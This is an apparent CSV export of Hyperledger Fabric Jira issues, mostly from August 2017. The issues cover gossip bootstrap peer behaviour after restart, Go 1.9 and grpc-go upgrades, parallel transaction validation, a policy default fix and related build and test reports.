These changes won't affect SDKs or CLI.;;;","27/Oct/17 4:13 AM;mastersingh24;[~muralisr]  it seems that adding the channel field is the right call.  Should not be too hard to modify the NodeJS and Java shims for this.;;;","27/Oct/17 4:21 AM;denyeart;There is already no compatibility between 1.1 peer and 1.0 chaincode image (due to TLS and private data collections that were added to proto).  Chaincode image will have to be removed and rebuilt upon peer upgrade to 1.1.  So I don't think we need to be concerned about yet another compatibility break, and I therefore agree with Gari that we can go ahead and add the channel field.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"peer is isolated after restart, if no bootstrap peer is available",FAB-5922,20422,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,scottz,scottz,26/Aug/17 4:43 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,Future,v1.0.0,,,,fabric-gossip,,,,,,0,,,,,,,"A peer that is stopped and later restarted will come up as another org leader in a channel if the peer is unable to contact a bootstrap peer.

Expected Behavior: we expected the peer to persist the list of peers with which it had been gossiping, so it could contact them and rejoin them when it restarts.

Consider this scenario, with delays and invokes between each step. Assume all peers mentioned are in same org.
```
1. create peer0 ; peer0 elects self as leader
2. create peer1 with CORE_PEER_GOSSIP_BOOTSTRAP=peer0 ; peer1 contacts peer0, and becomes a nonLeader
3. create peer2 with CORE_PEER_GOSSIP_BOOTSTRAP=peer0,peer1 ; peer2 contacts peer0, and becomes a nonLeader
4. stop peer0 ; assume peer1 is elected new leader, and peer2 is still nonLeader
5. stop peer1
6. start peer1 ; peer1 elects self as leader, since it is isolated because peer0 (BOOTSTRAP peer) is unavailable. It would be helpful if the peer had persisted a list of peers in its org/channel, so it could contact peer2 now (and become a nonLeader - which is more appropriate since its ledger is likely lagging peer2)
```

Another option to consider might be to provide an API for the administrator to modify the peer's internal representation of the BOOTSTRAP env variable. I am not certain, but I think that could allow (in step 3) adding peer2 to the bootstrap list of peer1, and thus peer1 would find peer2 via bootstrap list when peer1 recovers in step 6. I believe that would require the peer to dynamically reread the BOOTSTRAP peer list - as well as USE the list after being restarted. Honestly I don't know if this design option could work, but it is just an idea that we brainstormed",,C0rWin,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyeen:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,scottz,suryalnvs,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Aug/17 11:40 PM;yacovm;But don't we have anchor peers just for that? 
If the peer is in some channel - there are anchor peers in that channel so it can connect to them, no?;;;","29/Aug/17 7:23 AM;scottz;That is a good idea. But it requires organizations willing to expose their addresses and create anchor peers. I am not sure how networks will progress, and whether that is likely to happen. So... are you saying the official stance (for now) is that the persistence idea is a non-starter? How about the API idea for changing the BOOTSTRAP peer list?

Nevertheless, let's assume we set up anchor peers per your recommendation. Then can you tell us what should we expect? Will we see an anchor peer sharing blocks with the restarted peer from the other organization? Or will the anchor peer share the IP addresses of all peers it knows, including presumably some in the restarted peer's organization, thereby allowing the restarted peer to find and contact other peers within its own organization and elect leader etc. ?;;;","29/Aug/17 4:21 PM;yacovm;I'm still missing something - in your scenario, when you stop peer0 at step (4) - you still have peer1 and peer2 running, right?
Then you stop and start peer1. 
Can't you make the bootstrap peer of peer1 be peer2? That'll solve the problem, no?

{quote}you saying the official stance (for now) is that the persistence idea is a non-starter? {quote}
No, I am not saying that, but I'm saying we need to think carefully about this,and see if there is a real demand (from customers, users) in doing so, and whether we should include peers from our org only or not, for how much time, etc. etc. 
Would like [~C0rWin] and [~mastersingh24] to chime in here. 

So, regarding the 2nd paragraph of yours - the anchor peer would essentially act as a bootstrap peer for the organization.;;;","29/Aug/17 10:27 PM;scottz;Goal: I am trying to prevent the possibility that there could be multiple peers running in an org that cannot all gossip with each other.

There will be times when people do not know all the peers when starting the network, such as when peer2 is added months later. And we would not know which peers will be stopped or even deleted at some point in future. And when we add peer2, there is no way to change the bootstrap peer (list) of existing peers peer0 and peer1. Hence the idea for an API to be provided for that purpose. That actually might be more desirable than using anchor peers, because we won't know which if any of them would be available when we need them. The most thorough solution would be to provide the ability to make all peers in a network be bootstrap peers of all other peers, whenever a peer is added. That way, each peer has the knowledge it needs, instead of depending on other specific peers. That said, I realize that requires the system operator to manage the lists of bootstrap peers. Which leads me back to the persistence idea; once a peer talks to another peer, keep a list itself; it is an internal extension of the bootstrap peer list to a ""known peer list"".;;;","30/Aug/17 6:29 AM;yacovm;Bootstrap peers are used only for contacting peers from the same organization.

{quote}There will be times when people do not know all the peers when starting the network{quote}
How do you know that? 
{quote}
And we would not know which peers will be stopped or even deleted at some point in future.{quote}
Fabric is a solution for a permissioned environment, and in such an environment, you have a certificate authority and your servers in your own organization don't wander around, and you know which servers run where. I can argue the opposite thing - if a server migrated to a different ip address, the organization would know that, but the persisted bootstrap entry won't. 
I'd expect a network operator to update the bootstrap set when configuration changes are made.

Another thing we can argue, is that an organization that has a DNS server - can just produce a TLS certificate for that subject alternative name for a specific peer, and just update the DNS record each time the peer changes its IP address, and have such for all peers and have all peers be in the bootstrap set or something. 
{quote}
Hence the idea for an API to be provided for that purpose. That actually might be more desirable than using anchor peers, because we won't know which if any of them would be available when we need them{quote}
Anchor peers were meant for organizations to notify other organizations about their peers, via config updates. 
Having an API for a peer to locally change the anchor peer's address completely contradicts the anchor peer idea.

I'm not strongly against a local storage for the peer for persisting peers it knew before it crashed, but there are many questions one needs to ask:
* How long should each entry be kept?
* Should it be restricted to internal peers from your own org, or peers from other orgs too?;;;","31/Aug/17 2:02 AM;scottz;In response to your questions:

`How do you know that?`
Providers (e.g. such as Bluemix, providing IBM Blockchain services) can spin up a network for a customer, who can add peers or invite other orgs of peers to join their network. I know that because in the real world, things change. And instability and power outages must be expected and planned for.

`I'd expect a network operator to update the bootstrap set when configuration changes are made.`
Sure; they could provide an updated bootstrap set when creating a NEW peer. But today, there is no way to CHANGE the bootstrap set of the peers that are already running. That is the point of this bug. We have suggested two main alternatives for providing this capability: a means for an operator to update the bootstrap list of every peer (new or previously running), and a way for the peers to essentially automatically update their own bootstrap set by persisting a list of ""known peers in org"". (Note either method is based on the assumption that the bootstrap/persistence list would be useful after a peer is stopped and subsequently restarted - which we realize may be an extension of th intent of the bootstrap list.)

`Another thing we can argue,...`
Your discussion in this whole paragraph about how a customer might set things up with DNS could be very useful - although it is a different concern than that which we had raised.

`Anchor peers...`
OK; this is just a misunderstanding; we are not asking for this at all. The API requested was for assigning an updated list of bootstrap peers to existing peers in an org.

As for your last 2 bullet point questions about the persisted list of ""peers known in my org"":

`How long should each entry be kept?`
We consider this as an extended form of bootstrap list. As discussed previously, we see this as a replacement or supplemental alternative to providing the API for modifying bootstrap list; we agree there are pros and cons that should be weighed. Don't know how long the identity and address of a neighbor peer should be persisted after losing contact with it; we could brainstorm about it, maybe even keeping it forever - but allowing for deletion when it is proactively de-configured/removed. This might work in a wholly managed permissioned network.

`Should it be restricted to internal peers from your own org, or peers from other orgs too?`
It seems it would be a good decision to restrict this to the internal org, just like the bootstrap list.

Let's remember that all of us in this fabric community are trying to provide a flexible fabric to increase its acceptance - and should expect customers to plug in their own chaincodes and policies, and configure it and use it in many ways, some of which are certainly unforeseen today. Many of our requests are attempts to make it easier for service providers to manage their fabric network implementations.;;;","06/Sep/17 8:02 PM;C0rWin;I do not think that such API is required, since BOOTSTRAP peers needed only upon peer startup and update is relevant only if peer has been restarted and the old BOOTSTRAP peer no longer available. In case of the restart configuration parameter might be easily updated and peer will reconnect to existing network entities. I do not see any value in API which will allow dynamic configuration of bootstrap peers.

> But today, there is no way to CHANGE the bootstrap set of the peers that are already running. That is the point of this bug.

Just to make it clear, there is no reason to change bootstrap set of the peers which already running. And since this is not a bug but rather a feature request we can issue a review needed so other maintainers will be able to to weight in. At any case I'm lowering the priority of this to minor, since this is definitely should not be targeted for 1.1.;;;","07/Sep/17 12:09 AM;scottz;I understand the BOOTSTRAP peers are useful only at startup, so I agree the feature would need to be implemented in such a way as to be useful at other times too. The current implementation of bootstrap is INSUFFICIENT, and that is why this is a BUG. We can (1) extend the code logic using the bootstrap list so as to be useful at other times (along with providing an API to change the bootstrap peer list), or, we could (2) implement a persistence list that is generated automatically and would be leveraged at other times. For example, whenever a peer needs to retrieve more blocks, it could look for neighbor peers in bootstrap list and/or in this new persistence list before the last choice of connecting to the orderer directly.

Please correct me if I am wrong. It seems you are suggesting that there is a workaround for the situation when a bootstrap peer is stopped or deleted: you are suggesting we could stop each of the other peers in the organization, and start them again with new config parameters. That might work in a lab, but is not acceptable in a live production environment. We cannot expect service providers to accept such a workaround. Theoretically it might work - although it would require outage of every peer, and it would require each peer to rebuild their entire ledger, and of course the peer would lag for a long time while it catches up. That is much more severe even than requiring an upgrade. Since these behaviors are not acceptable, we requested the API and a modified behavior  (to use the new information at times other than startup) as a possible solution.

 ;;;","07/Sep/17 5:53 AM;C0rWin;[~scottz] Bootstrap peer useful at *startup* only, it's pointless to make any type of dynamic updates. Once peers is started it has established membership lost of any of bootstrap peer will not have any effect up until peer will be restarted for some reason.

> Please correct me if I am wrong. It seems you are suggesting that there is a workaround

My suggestion is not a workaround but indented way to go, let me repeat it again if bootstrap peer was crashed or replaced or something else happened it won't have any effect on already running peers, unless you will need to restart them. However if you going to restart a peer for some reason then you can also update list of the bootstrap peers on the same occasion. *In no meaning I was suggesting to intentionally stop the peer to update bootstrapping list.*

> Since these behaviors are not acceptable, we requested the API and a modified behavior

Since you requesting to add new API please consider open a feature request adding review needed tag, btw such request might be valid for many other configuration parameters as well, so I'd suggest to generalize it to something which will take care to add an ability of dynamic configuration reload/update w/o a need of restarting peer.;;;","07/Sep/17 8:21 AM;scottz;Per lengthy and helpful discussion with [~C0rWin], we will pursue the suggestion to edit config file, for every peer, to set ""CORE_PEER_GOSSIP_BOOTSTRAP"" to a new value (an updated list of other peers in the organization), every time a peer is added or removed from an org. If this works, then whenever a peer is stopped and started (either power outage or manual stop), then it would use the new value when starting up again. This is not the same as dynamically modifying a bootstrap list with an API, or internally remembering and persisting a list of all known peers in one's organization, but it would still allow each peer to connect and gossip with any/all other available peers in its org. If this is confirmed satisfactory to the customer, we will respond here and potentially close this issue.

We will give further thought to the idea for creating a feature request for an expanded API to change this and many other config parameters.;;;","19/Jun/18 10:41 PM;scottz;[~C0rWin] Please explain why you have marked this as invalid, for the record, before we close this. If it is because the maintainers have discussed and agreed that this is not a necessary, or desirable, or too disruptive, then please share that information here.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade fabric-baseimage to Go 1.9,FAB-5923,20443,19479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,26/Aug/17 8:35 PM,27/Nov/19 2:17 AM,28/Oct/23 3:00 AM,09/Sep/17 5:50 PM,,,,v1.1.0,,,,,,,,0,,,,,,,,,harsha544,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyef3:",,,,,,,,,,,,,,,,,,,,,,,harsha544,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Compile fabric with Go 1.9,FAB-5924,20444,19479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,26/Aug/17 8:37 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Sep/17 7:37 PM,,,,v1.1.0,,fabric-ca,,,,,,0,,,,,,,"There are a few changes in Go 1.9 that might require some changes to the core fabric code.

Those changes will be made as part of this task.

Changes:

1) core/comm - The TLS stack now supports directly using the server cert for verification

2) core/chaincode/platforms/golang - GOPATH now defaults to $HOME/go if not set

 ",,bsmita,harsha544,mastersingh24,rameshthoomu,SriramaSharma,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5925,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/17 2:59 PM;harsha544;go1.9_UT_Failure_ppc64le.log;https://jira.hyperledger.org/secure/attachment/11966/go1.9_UT_Failure_ppc64le.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyefb:",,,,,,,,,,,,,,,,,,,,,,,bsmita,harsha544,mastersingh24,rameshthoomu,SriramaSharma,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Aug/17 3:18 AM;mastersingh24;https://gerrit.hyperledger.org/r/12819;;;","29/Aug/17 2:59 PM;harsha544;Hi Gari,

Thanks for the PR,  I am seeing consistent failures wrt to Ubuntu 1604 on ppc64le on the below UT
core/chaincode/shim
Attached the logs for further debugging.;;;","29/Aug/17 3:01 PM;harsha544;Not sure if *make linter* error is specific to arch , but here's what I see on ppc64le :-
root@p006vm20:/opt/gopath/src/github.com/hyperledger/fabric# make linter
LINT: Running code checks..
Checking ./bccsp
Checking ./common
common/tools/configtxlator/sanitycheck/sanitycheck.go:33: struct field ElementErrors repeats json tag ""element_errors"" also at common/tools/configtxlator/sanitycheck/sanitycheck.go:32
exit status 1
Makefile:184: recipe for target 'linter' failed
make: *** [linter] Error 1
root@vm20:/opt/gopath/src/github.com/hyperledger/fabric# go version
go version go1.9 linux/ppc64le
root@vm20:/opt/gopath/src/github.com/hyperledger/fabric#;;;","29/Aug/17 9:19 PM;mastersingh24;I'll check the linter - might be more strict in 1.9 or possibly just left over from before.
I've verified that with baseimage v0.3.3, Go 1.9 works well on x86 (so far).
I just configured a P8 system with Ubuntu 14.04, Docker CE 17.06 and Compose 1.15.  Will update with my results.
[~harsha544] is going to try the same as well (except I believe he's in Ubuntu 16.04);;;","29/Aug/17 10:59 PM;harsha544;Hi Gari, 
Post Updating Docker to CE 1706 and docker-compose to 1.15. I no longer see the above reported UT failure i.e core/chaincode/shim .

However I now see UT is failing at one of the things under gossip.;;;","13/Sep/17 3:05 AM;rameshthoomu;Tested [https://gerrit.hyperledger.org/r/#/c/13303/] patch in sandbox power nodes (installing go 1.9) and below is the result..

[https://jenkins.hyperledger.org/sandbox/job/fabric-verify-power-ppc64le/11/] All unit-tests are passed and it took *57 mins* to complete full unit-test cycle.

Below are the build times took to run unit-tests on *go 1.9*

*z* ==> *47  mins*

*P ==> 61  mins*

*x86_64 ===> 72 mins*;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Compile fabric-ca with Go 1.9,FAB-5925,20445,19479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,26/Aug/17 8:37 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,23/Sep/17 5:15 AM,,,,v1.1.0,,fabric-build,,,,,,0,,,,,,,"There are a few changes in Go 1.9 that might require some changes to the core fabric code.

Those changes will be made as part of this task",,bsmita,harsha544,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5924,,,,,,FABC-83,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyefj:",,,,,,,,,,,,,,,,,,,,,,,bsmita,harsha544,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow list (whitelist) for CC installation,FAB-5926,20446,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,troyronda,troyronda,27/Aug/17 1:53 AM,23/Jan/20 7:03 AM,28/Oct/23 3:00 AM,23/Jan/20 7:03 AM,,,,,,,,,,,,0,stale-item,,,,,,"A consortium who uses an out-of-band process to certify an implementation ideally produces an allow list for CC installation (e.g., hashes of the platform packages submitted to peers).

See [comment on FAB-5460|https://jira.hyperledger.org/browse/FAB-5682?focusedCommentId=30236&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-30236] for some context.",,sykesm,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5460,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyefr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sykesm,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:03 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade to fabric-baseimage/baseos v0.3.2,FAB-5927,20447,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,27/Aug/17 3:10 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Aug/17 7:26 PM,,,,v1.0.2,v1.1.0,fabric-build,fabric-peer,,,,,0,,,,,,,"v0.3.2 brings in 2 changes:
 * timezone data required for setting the timezone for Go chaincode
 * upgrades NodeJS to v8.4 for the NodeJS chaincode work",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5210,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyefz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Aug/17 3:23 AM;mastersingh24;https://gerrit.hyperledger.org/r/12821;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement ack-based private data dissemination,FAB-5929,20449,18792,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Aug/17 7:25 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 4:14 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyegf:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade to grpc-go 1.5.2,FAB-5930,20450,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,27/Aug/17 8:35 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,11/Sep/17 5:33 PM,,,,v1.1.0,,fabric-orderer,fabric-peer,,,,,0,v1.1-candidate,,,,,,"v1.0.x currently uses grpc-go 1.4.0.  grpc-go 1.5.2 was released a few weeks back and we should try to stay current.  Addtionally, 1.5.2 is now license under Apache2.  There are some performance improvements and some new features to tweak logging as well.",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Work time is short - but running the full unit test suite is time consuming;28/Aug/17 6:47 AM;mastersingh24;3600",,3600,0,3600,100%,3600,0,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyegn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 6:46 AM;mastersingh24;https://gerrit.hyperledger.org/r/12833;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The common/tools/configtxgen/provisional/provisional.go has some spelling error.,FAB-5931,20454,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,TopJohn,TopJohn,TopJohn,28/Aug/17 2:39 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,31/Aug/17 3:50 PM,,,,,,,,,,,,0,,,,,,,Line 70 : `It it` should be `It is`.It is a stupid error.,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyegv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Paralelize transaction validation (VSCC),FAB-5932,20455,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,ales,vukolic,vukolic,28/Aug/17 6:00 PM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,12/Oct/17 2:23 AM,v1.0.1,,,v1.1.0,,fabric-peer,,,,,31/Aug/17 12:00 AM,0,,,,,,,"Block/transaction validation in VSCC is as of v1.0.1 sequential and single-threaded. Therefore the transaction validation does not scale with CPU. This implies a performance bottleneck in VSCC, which amounts to about 500-600 tps - on small scale Fabric deployments - where transactions pertain to a simple utxo cryptocurrency application we built on Fabric with a *single* endorsement. This validation bottleneck in those experiments is also an end-to-end throughput bottleneck and, as such, critical. 

 

Fix to this issue would allow parallelized VSCC to scale with CPU (number of peer cores).",,ales,inatatsu,qiang0723,thakkarparth007,troyronda,vukolic,wutongtree,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,FAB-6421,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyeh3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ales,inatatsu,qiang0723,thakkarparth007,troyronda,vukolic,wutongtree,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 6:13 PM;vukolic;[~angelo.decaro] [~Senthil1];;;","26/Sep/17 11:42 PM;Clayton Sims;What is CR for this one?;;;","26/Sep/17 11:55 PM;ales;[https://gerrit.hyperledger.org/r/#/c/13045/|https://gerrit.hyperledger.org/r/#/c/13045/8] and [https://gerrit.hyperledger.org/r/#/c/12849/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Hyperledger tests fail after build,FAB-5933,20456,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,hl-admin,mudlee,mudlee,28/Aug/17 8:39 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,05/Nov/17 8:26 PM,,,,Unverifiable,,fabric-build,,,,,,0,,,,,,,"I followed the doc how to build my own binaries, despite everything went fine when I ran make dist-clean all, however some of the tests failed. See the atteched logs.",CentOS 7,mastersingh24,mudlee,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Aug/17 8:39 PM;mudlee;log.rtf;https://jira.hyperledger.org/secure/attachment/11959/log.rtf",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx0k7:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,mudlee,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Sep/17 8:43 PM;mastersingh24;This is hard to reproduce.  Unfortunately, some of the tests will randomly timeout.
Looks like you were just running *make unit-tests* ?  Did you try multiple times and fail each time?;;;","05/Nov/17 8:26 PM;mastersingh24;No response in over 60 days so I'm going to close this.  [~mudlee]  - hopefully you've been refreshing your close and things are working.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Store peer StateInfo,FAB-5934,20457,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,gennadyl,gennadyl,gennadyl,28/Aug/17 9:07 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 5:46 PM,,,,,,fabric-gossip,,,,,,0,gossip,,,,,,"While storing peer StateInfo in channel, is stored in message store and in case of successful parsing, stored in special filed for quick access. The idea is to move storage to message store after parsing. ",,gennadyl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzyehb:",,,,,,,,,,,,,,,,,,,,,,,gennadyl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bad default mod_policy for policy /Channel/Consortiums/Admins,FAB-5937,20463,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,28/Aug/17 11:51 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 4:16 PM,v1.0.0,v1.0.1,,v1.0.2,v1.1.0,fabric-tools,,,,,,0,configtxgen,,,,,,"The {{mod_policy}} for {{/Channel/Consortiums/Admins}} currently defaults to itself, {{Admins}}, but this should really be the orderer admins policy.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyel3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 11:56 PM;jyellick;Fix for v1.1 https://gerrit.hyperledger.org/r/#/c/12855/
Fix for v1.0.2 https://gerrit.hyperledger.org/r/#/c/12857/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE works with composer-generated chaincode,FAB-5938,20464,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,28/Aug/17 11:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,17/Oct/17 5:52 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"PTE works with composer-generated chaincode

Collection of composer apps: [https://github.com/hyperledger/composer-sample-networks/tree/master/packages]

Docs: https://hyperledger.github.io/composer/
  ",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyelb:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Sep/17 4:09 AM;dongming;Two ways to driver composer generated  chaincode: through REST API or through composer node SDK

PTE is unable to communicate with composer generated chaincode.

Composer APIs: https://hyperledger.github.io/composer/jsdoc/index.html 

Composer example: [https://github.com/hyperledger/composer-sample-networks]

Composer tutorial: https://hyperledger.github.io/composer/tutorials/tutorials.html

 

